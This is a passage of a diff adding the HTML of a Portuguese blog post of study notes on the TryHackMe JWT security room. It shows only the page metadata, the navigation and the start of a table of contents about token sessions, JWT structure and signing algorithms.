@@ -1,0 +1,1484 @@
+<!DOCTYPE html>
+<html lang="pt" dir="ltr"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="robots" content="noindex, nofollow" />
+  <link rel="icon shortcut" href="/favicon.ico" sizes="32x32" />
+<link rel="icon" href="/favicon.svg" type="image/svg+xml" id="favicon-svg" />
+<link rel="icon" href="/favicon-16x16.png" type="image/png" sizes="16x16" />
+<link rel="icon" href="/favicon-32x32.png" type="image/png" sizes="32x32" />
+<link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180" />
+<link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
+<title>JWT - Security - THM – Alex Paulino</title>
+  <meta name="description" content="Objetivos Aprender sobre autenticação baseada em token. Aprender sobre JSON web tokens (JWTs). Aprender o porque JWT são populares. Aprender sobre segurança no uso de JWT. Aprender como atacar vulnerabilidade na implementação de JWT. Introdução Um dos motivos da popularidade das API (Application Programming Interfaces) é sua vantagem de ser usada em diversas interfaces diferentes, com uma única API podemos conversar com uma aplicação web ou mobile, simultaneamente se necessário, além disso, pensando pelo lado da segurança, podemos implementar controles mais centralizados do lado do servidor. Nesse artigo irei estudar e documentar, a aula disponível de JWT na plataforma TryHackMe." /><link rel="canonical" href="http://localhost:1313/posts/2025/2025-01-05-jwt-security/" itemprop="url" />
+
+<meta property="og:title" content="JWT - Security - THM">
+<meta
+  property="og:description"
+  content="
+    
+      Objetivos
+    
+Aprender sobre autenticação baseada em token.
+Aprender sobre JSON web tokens (JWTs).
+Aprender o porque JWT são populares.
+Aprender sobre segurança no uso de JWT.
+Aprender como atacar vulnerabilidade na implementação de JWT.
+
+Introdução
+    Um dos motivos  da popularidade das API (Application Programming Interfaces) é sua vantagem  de ser usada em diversas interfaces diferentes, com uma única API podemos conversar com uma aplicação web ou mobile, simultaneamente se necessário, além disso, pensando pelo lado da segurança, podemos implementar controles mais centralizados do lado do servidor.
+Nesse artigo irei estudar e documentar, a aula disponível de JWT na plataforma TryHackMe.
+    
+  ">
+<meta
+  property="og:type"
+  content="
+    article
+  ">
+<meta property="og:url" content="http://localhost:1313/posts/2025/2025-01-05-jwt-security/"><meta property="article:section" content="posts">
+
+<meta
+  property="article:published_time"
+  content="2025-01-05T10:44:00-03:00">
+
+
+<meta
+  property="article:modified_time"
+  content="2025-01-05T10:44:00-03:00">
+
+
+
+	<meta itemprop="name" content="JWT - Security - THM">
+	<meta itemprop="description" content="Objetivos Aprender sobre autenticação baseada em token. Aprender sobre JSON web tokens (JWTs). Aprender o porque JWT são populares. Aprender sobre segurança no uso de JWT. Aprender como atacar vulnerabilidade na implementação de JWT. Introdução Um dos motivos da popularidade das API (Application Programming Interfaces) é sua vantagem de ser usada em diversas interfaces diferentes, com uma única API podemos conversar com uma aplicação web ou mobile, simultaneamente se necessário, além disso, pensando pelo lado da segurança, podemos implementar controles mais centralizados do lado do servidor. Nesse artigo irei estudar e documentar, a aula disponível de JWT na plataforma TryHackMe.">
+	<meta itemprop="datePublished" content="2025-01-05T10:44:00-03:00">
+	<meta itemprop="dateModified" content="2025-01-05T10:44:00-03:00">
+	<meta itemprop="wordCount" content="3181">
+	<meta itemprop="keywords" content="Api,Tryhackme,Web,Application,Jwt,Pentest">
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:title" content="JWT - Security - THM">
+	<meta name="twitter:description" content="Objetivos Aprender sobre autenticação baseada em token. Aprender sobre JSON web tokens (JWTs). Aprender o porque JWT são populares. Aprender sobre segurança no uso de JWT. Aprender como atacar vulnerabilidade na implementação de JWT. Introdução Um dos motivos da popularidade das API (Application Programming Interfaces) é sua vantagem de ser usada em diversas interfaces diferentes, com uma única API podemos conversar com uma aplicação web ou mobile, simultaneamente se necessário, além disso, pensando pelo lado da segurança, podemos implementar controles mais centralizados do lado do servidor. Nesse artigo irei estudar e documentar, a aula disponível de JWT na plataforma TryHackMe.">
+<link href="/css/compiled/main.css" rel="stylesheet" />
+    <link href="/css/variables.css" rel="stylesheet" />
+    <link href="/css/custom.css" rel="stylesheet" />
+
+  
+<script src="/js/main-head.js" integrity=""></script>
+
+  
+  
+  </head>
+<body>
+    <a href="#content" class="hx:sr-only hx:focus-visible:not-sr-only hx:focus-visible:fixed hx:focus-visible:z-50 hx:focus-visible:top-2 hx:focus-visible:left-2 hx:focus-visible:bg-primary-500 hx:focus-visible:text-white hx:focus-visible:px-4 hx:focus-visible:py-2 hx:focus-visible:rounded-md hx:focus-visible:text-sm hx:focus-visible:font-medium">Saltar para o conteúdo</a><div class="hextra-nav-container hx:sticky hx:top-0 hx:z-20 hx:w-full hx:bg-transparent hx:print:hidden">
+  <div
+    class="hextra-nav-container-blur hx:pointer-events-none hx:absolute hx:z-[-1] hx:h-full hx:w-full hx:bg-white hx:dark:bg-dark hx:shadow-[0_2px_4px_rgba(0,0,0,.02),0_1px_0_rgba(0,0,0,.06)] hx:contrast-more:shadow-[0_0_0_1px_#000] hx:dark:shadow-[0_-1px_0_rgba(255,255,255,.1)_inset] hx:contrast-more:dark:shadow-[0_0_0_1px_#fff]"
+  ></div>
+
+  <nav class="hextra-max-navbar-width hx:mx-auto hx:flex hx:items-center hx:justify-end hx:gap-1 hx:md:gap-2 hx:h-[var(--hextra-navbar-height)] hx:px-6">
+    <a class="hx:flex hx:items-center hx:hover:opacity-75 hx:ltr:mr-auto hx:rtl:ml-auto" href="/">
+    <img class="hx:mr-2 hx:block hx:dark:hidden" src="/images/logo.svg" alt="Logo" height="20" width="20" />
+    <img class="hx:mr-2 hx:hidden hx:dark:block" src="/images/logo.svg" alt="Dark Logo" height="20" width="20" />
+    <span class="hx:mr-2 hx:font-extrabold hx:inline hx:select-none">Alex Paulino</span>
+</a>
+<button
+    type="button"
+    class="hextra-search-trigger"
+    data-search-open
+    aria-haspopup="dialog"
+    aria-controls="hextra-search-dialog"
+    aria-label="Procurar..."
+  ><svg class="hextra-search-trigger-icon" focusable="false" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg><span class="hextra-search-trigger-label">Procurar...</span>
+    <kbd class="hextra-search-trigger-kbd">CTRL K</kbd>
+  </button><a
+  title=""
+  href="/about/"
+  
+  class="hx:text-sm hx:contrast-more:text-gray-700 hx:contrast-more:dark:text-gray-100 hx:relative hx:-ml-2 hx:hidden hx:whitespace-nowrap hx:p-2 hx:md:inline-flex hx:items-center hx:gap-1 hx:text-gray-600 hx:hover:text-gray-800 hx:dark:text-gray-400 hx:dark:hover:text-gray-200"
+><span class="hx:text-center">Sobre</span>
+</a>
+          <a class="hx:p-1 hx:md:p-2 hx:text-current" target="_blank" rel="noreferrer" href="https://github.com/alxpas" title="GitHub"><svg height=24 fill="currentColor" viewBox="3 3 18 18">
+  <path d="M12 3C7.0275 3 3 7.12937 3 12.2276C3 16.3109 5.57625 19.7597 9.15374 20.9824C9.60374 21.0631 9.77249 20.7863 9.77249 20.5441C9.77249 20.3249 9.76125 19.5982 9.76125 18.8254C7.5 19.2522 6.915 18.2602 6.735 17.7412C6.63375 17.4759 6.19499 16.6569 5.8125 16.4378C5.4975 16.2647 5.0475 15.838 5.80124 15.8264C6.51 15.8149 7.01625 16.4954 7.18499 16.7723C7.99499 18.1679 9.28875 17.7758 9.80625 17.5335C9.885 16.9337 10.1212 16.53 10.38 16.2993C8.3775 16.0687 6.285 15.2728 6.285 11.7432C6.285 10.7397 6.63375 9.9092 7.20749 9.26326C7.1175 9.03257 6.8025 8.08674 7.2975 6.81794C7.2975 6.81794 8.05125 6.57571 9.77249 7.76377C10.4925 7.55615 11.2575 7.45234 12.0225 7.45234C12.7875 7.45234 13.5525 7.55615 14.2725 7.76377C15.9937 6.56418 16.7475 6.81794 16.7475 6.81794C17.2424 8.08674 16.9275 9.03257 16.8375 9.26326C17.4113 9.9092 17.76 10.7281 17.76 11.7432C17.76 15.2843 15.6563 16.0687 13.6537 16.2993C13.98 16.5877 14.2613 17.1414 14.2613 18.0065C14.2613 19.2407 14.25 20.2326 14.25 20.5441C14.25 20.7863 14.4188 21.0746 14.8688 20.9824C16.6554 20.364 18.2079 19.1866 19.3078 17.6162C20.4077 16.0457 20.9995 14.1611 21 12.2276C21 7.12937 16.9725 3 12 3Z"></path>
+</svg>
+<span class="hx:sr-only">GitHub</span>
+          </a>
+          <a class="hx:p-1 hx:md:p-2 hx:text-current" target="_blank" rel="noreferrer" href="https://www.linkedin.com/in/alexpaulino/" title="LinkedIn"><svg height=24 xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="currentColor" d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037c-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85c3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065a2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span class="hx:sr-only">LinkedIn</span>
+          </a><button type="button" aria-label="Menu" aria-expanded="false" class="hextra-hamburger-menu hx:cursor-pointer hx:-mr-1 hx:rounded-sm hx:p-1 hx:active:bg-gray-400/20 hx:md:hidden hx:hextra-focus-visible-inset"><svg height=24 fill="none" viewBox="0 0 24 24" stroke="currentColor"><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 8H20"></path></g><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16H20"></path></g></svg></button>
+  </nav>
+</div>
+
+  <div class="hx:mx-auto hx:flex hextra-max-page-width">
+    <aside class="hextra-sidebar-container hx:flex hx:flex-col hx:print:hidden hx:md:top-[var(--hextra-navbar-height)] hx:md:shrink-0 hx:md:w-64 hx:md:self-start hx:max-md:[transform:translate3d(0,-100%,0)] hx:md:hidden hx:xl:block">
+  <div class="hextra-scrollbar hx:overflow-y-auto hx:overflow-x-hidden hx:p-4 hx:grow hx:md:h-[calc(100vh-var(--hextra-navbar-height)-var(--menu-height))]">
+    <ul class="hx:flex hx:flex-col hx:gap-1 hx:md:hidden">
+      
+      <li><div class="hextra-sidebar-item hx:group hx:relative hx:flex hx:items-center" data-active="false">
+    <a
+      class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:grow hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:hextra-focus-visible-inset hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+      href="/about/"
+      
+    >
+      <span class="hx:min-w-0 [word-break:break-word]">Sobre</span>
+    </a>
+  </div></li>
+    </ul>
+
+    <div class="hx:max-xl:hidden hx:h-0 hx:w-64 hx:shrink-0"></div></div>
+  
+  
+    <div class="hx:md:hidden hx:justify-end hx:sticky hx:bottom-0 hx:max-h-(--menu-height) hx:bg-white hx:dark:bg-dark hx:mx-4 hx:py-4 hx:shadow-[0_-12px_16px_#fff] hx:flex hx:items-center hx:gap-2 hx:border-gray-200 hx:dark:border-neutral-800 hx:dark:shadow-[0_-12px_16px_#111] hx:contrast-more:border-neutral-400 hx:contrast-more:shadow-none hx:contrast-more:dark:shadow-none hx:border-t" data-toggle-animation="show"><div class="hx:flex hx:justify-items-start hx:grow">
+    <button
+      title="Mudar a língua"
+      data-state="closed"
+      data-location=""
+      class="hextra-language-switcher hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:grow"
+      type="button"
+      aria-label="Mudar a língua"
+      aria-expanded="false"
+      aria-haspopup="menu"
+    >
+      <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/></svg><span>Português</span></div>
+    </button>
+    <ul
+      class="hextra-language-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+      style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+      role="menu"
+    >
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/posts/2025/2025-01-05-jwt-security/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >Português<span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span></a>
+        </li>
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/en/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >English</a>
+        </li>
+      </ul>
+  </div><div class="hx:flex hx:justify-items-start hx:group" data-theme="light">
+  <button
+    title="Mudar tema"
+    data-state="closed"
+    data-location="bottom-right"
+    class="hextra-theme-toggle hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:font-medium hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:grow"
+    type="button"
+    aria-label="Mudar tema"
+    aria-expanded="false"
+    aria-haspopup="menu"
+  >
+    <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><svg height=12 class="hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"  fill="currentColor">
+  <path d="M 11.996094,2 C 6.4986225,2.0192368 2.03125,6.5024993 2.03125,12 c 0,5.497501 4.4673725,9.980763 9.964844,10 H 12 12.0039 c 5.497471,-0.01924 9.964844,-4.502499 9.964844,-10 0,-5.4975007 -4.467373,-9.9807632 -9.964844,-10 H 12 Z M 12,4 c 4.417218,0.017598 7.96875,3.5822356 7.96875,8 0,4.417764 -3.551532,7.982402 -7.96875,8 z" />
+</svg>
+</div>
+  </button>
+  <ul
+    class="hextra-theme-toggle-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+    style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+    data-theme="light"
+    role="menu"
+  >
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="true"
+        tabindex="-1"
+        data-item="light"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Claro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="dark"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Escuro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="system"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Sistema
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+  </ul>
+</div>
+</div></aside>
+    
+<nav class="hextra-toc hx:order-last hx:hidden hx:w-64 hx:shrink-0 hx:xl:block hx:print:hidden hx:px-4" aria-label="Índice">
+    <div class="hextra-scrollbar hx:sticky hx:top-[var(--hextra-navbar-height)] hx:overflow-y-auto hx:pr-4 hx:pt-6 hx:text-sm [hyphens:auto] hx:max-h-[calc(100vh-var(--hextra-navbar-height)-env(safe-area-inset-bottom))] hx:ltr:-mr-4 hx:rtl:-ml-4"><p class="hx:mb-4 hx:font-semibold hx:tracking-tight">Nesta página</p><ul>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#objetivos">Objetivos
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#introdu%c3%a7%c3%a3o">Introdução
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#gerenciamento-de-sess%c3%a3o-baseado-em-token">Gerenciamento de Sessão baseado em Token.
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#projeto-de-api">Projeto de API
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#apiendpoints">API Endpoints
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#credenciais-de-api">Credenciais de API
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#exemplos-de-api">Exemplos de API
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#exemplo-de-token">Exemplo de token
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#perguntas">Perguntas
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-12 hx:rtl:pr-12 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#what-is-the-common-header-used-to-transport-the-jwt-in-a-request">What is the common header used to transport the JWT in a request?
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#json-web-tokens">JSON Web Tokens
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#estrutura-jwt">Estrutura JWT
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#algoritmos-de-assinatura">Algoritmos de assinatura
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#seguran%c3%a7a-na-assinatura">Segurança na assinatura
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#perguntas-1">Perguntas
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#hs256-is-an-example-of-what-type-of-signing-algorithm">HS256 is an example of what type of signing algorithm?
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#rs256-is-an-example-of-what-type-of-signing-algorithm">RS256 is an example of what type of signing algorithm?
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
